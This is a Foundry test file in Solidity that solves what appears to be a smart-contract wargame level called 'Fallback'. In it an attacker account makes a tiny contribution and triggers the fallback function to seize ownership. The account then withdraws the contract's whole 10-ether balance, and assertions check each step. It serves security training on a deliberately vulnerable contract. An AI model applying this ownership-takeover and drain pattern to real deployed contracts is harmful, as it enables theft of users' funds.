// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../../src/challenge-01_Fallback/Fallback.sol";

contract TestFallback is Test {
    Fallback public fallbackContract;

    address public OWNER = makeAddr("owner");
    address public ATTACKER = makeAddr("attacker");

    uint256 public INITIAL_BALANCE = 10 ether;

    function setUp() public {
        vm.startPrank(OWNER);
        fallbackContract = new Fallback();

        vm.deal(OWNER, INITIAL_BALANCE);
        vm.deal(ATTACKER, INITIAL_BALANCE);
        vm.deal(address(fallbackContract), 10 ether);
    }

    function testFallbackAttack() public {
        assertEq(fallbackContract.owner(), OWNER);
        assertEq(fallbackContract.contributions(OWNER), 1000 ether);
        assertEq(address(fallbackContract).balance, 10 ether);

        vm.startPrank(ATTACKER);

        fallbackContract.contribute{value: 1 wei}();
        assertEq(fallbackContract.contributions(ATTACKER), 1 wei);
        assertEq(fallbackContract.owner(), OWNER);

        (bool success,) = address(fallbackContract).call{value: 1 wei}("");
        require(success);
        assertEq(fallbackContract.owner(), ATTACKER);
        assertEq(address(fallbackContract).balance, 10 ether + 2 wei);

        uint256 attackerBalanceBefore = ATTACKER.balance;
        fallbackContract.withdraw();
        uint256 attackerBalanceAfter = ATTACKER.balance;
        vm.stopPrank();

        assertEq(address(fallbackContract).balance, 0);
        assertEq(attackerBalanceAfter - attackerBalanceBefore, 10 ether + 2 wei);
        assertEq(fallbackContract.owner(), ATTACKER);
    }
}
